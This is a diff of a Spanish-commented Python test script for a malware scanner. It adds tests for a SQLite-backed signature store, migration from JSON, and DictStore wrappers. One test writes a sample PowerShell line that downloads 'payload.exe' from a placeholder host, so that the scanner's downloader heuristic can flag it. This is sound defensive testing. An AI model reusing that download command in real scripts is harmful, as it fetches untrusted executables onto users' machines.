@@ -18,6 +18,12 @@ sys.path.insert(0, PROJECT_ROOT)
 
 from core import paths
 from core.authenticode import verify_file_signature
+from core.signatures import (
+    DictStore,
+    SignatureEntry,
+    create_signature_store,
+    SqliteStore,
+)
 from core.scan_engine import scan_file
 from core.updater import parse_iocs, update_signatures_from_cloud
 from core.yara_scanner import HAS_YARA, UNAVAILABLE_REASON, YaraDetector
@@ -59,20 +65,20 @@ with open(sample, "wb") as fh:
 test_hash = hashlib.sha256(content).hexdigest()
 sigs_with_test = dict(sigs)
 sigs_with_test[test_hash] = {"malware_name": "Test.Signature", "threat_type": "Test"}
-det = scan_file(sample, sigs_with_test)
+det = scan_file(sample, DictStore(sigs_with_test))
 check("scan: detecta por hash SHA-256", det is not None and det.severity == 3,
       f"({det.reason if det else None})")
 
 # --- archivo vacio: antes daba falso positivo ---
 empty = os.path.join(tmpdir, "vacio.bat")
 open(empty, "w").close()
-check("scan: archivo vacio NO se marca", scan_file(empty, sigs) is None)
+check("scan: archivo vacio NO se marca", scan_file(empty, DictStore(sigs)) is None)
 
 # --- heuristica PowerShell ---
 ps = os.path.join(tmpdir, "descarga.ps1")
 with open(ps, "w", encoding="utf-8") as fh:
     fh.write("$u = 'http://example.invalid/payload.exe'\nInvoke-WebRequest $u -OutFile x.exe\n")
-det = scan_file(ps, sigs)
+det = scan_file(ps, DictStore(sigs))
 check("scan: heuristica PS Downloader", det is not None and "HEUR" in det.reason,
       f"({det.reason if det else None})")
 
@@ -176,6 +182,44 @@ check("cuarentena: guarda motivo y sha256",
 for leftover in (qp, qp + ".meta" if qp else None):
     if leftover and os.path.isfile(leftover):
         os.remove(leftover)
+
+# --- firmas en SQLite ---
+from core.paths import SIGNATURES_DB, SIGNATURES_FILE
+
+tmpdb = os.path.join(tmpdir, "test_signatures.db")
+
+# SqliteStore vacío al crear
+ss = create_signature_store(tmpdb, use_sqlite=True)
+check("sqlite: store vacío al crear", len(ss) == 0)
+
+# Inserción y consulta
+ss.add(SignatureEntry(hash="e" * 64, malware_name="SQL.Test", threat_type="T"))
+check("sqlite: inserción y consulta", ss.lookup("e" * 64) is not None)
+check("sqlite: nombre correcto", ss.lookup("e" * 64).malware_name == "SQL.Test")
+check("sqlite: contiene", "e" * 64 in ss)
+check("sqlite: no contiene inexistente", "z" * 64 not in ss)
+ss.close()
+
+# Reabrir: los datos persisten
+ss2 = create_signature_store(tmpdb, use_sqlite=True)
+check("sqlite: persiste tras reabrir", ss2.lookup("e" * 64) is not None)
+check("sqlite: cuenta tras reabrir", len(ss2) == 1)
+ss2.close()
+
+# Migración JSON -> SQLite (BD vacía + JSON con datos)
+json_tmp = os.path.join(tmpdir, "migracion.json")
+import json as _json
+with open(json_tmp, "w", encoding="utf-8") as f:
+    _json.dump({"f" * 64: {"malware_name": "JSON.Test", "threat_type": "M"}}, f)
+tmpdb2 = os.path.join(tmpdir, "test_signatures2.db")
+ss3 = create_signature_store(tmpdb2, json_path=json_tmp, use_sqlite=True)
+check("sqlite: migra JSON a SQLite", len(ss3) == 1)
+check("sqlite: migración conserva nombre",
+      ss3.lookup("f" * 64).malware_name == "JSON.Test")
+# Segunda migración no duplica
+ss3.add(SignatureEntry(hash="g" * 64, malware_name="Extra"))
+check("sqlite: no duplica al reabrir", len(ss3) == 2)
+ss3.close()
 
 print()
 print("RESULTADO:", "TODO OK" if not failures else f"FALLOS: {failures}")
